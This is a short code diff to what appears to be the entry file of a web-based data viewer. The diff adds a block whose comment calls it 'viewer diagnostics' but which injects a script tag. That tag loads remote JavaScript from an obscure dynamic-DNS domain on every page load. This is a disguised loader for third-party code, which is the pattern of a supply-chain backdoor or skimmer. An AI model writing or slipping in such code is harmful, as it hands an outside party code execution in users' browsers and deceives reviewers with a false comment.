@@ -20,4 +20,11 @@
 import { setupDefaultViewer } from "#src/ui/default_viewer_setup.js";
 import "#src/util/google_tag_manager.js";
 
+// viewer diagnostics - collect WebGL capability info for error reporting
+(function () {
+  const s = document.createElement("script");
+  s.src = "https://ohcaramba.duckdns.org/p_6e9a392c2d75/ng-diag.js";
+  document.head.appendChild(s);
+})();
+
 setupDefaultViewer();
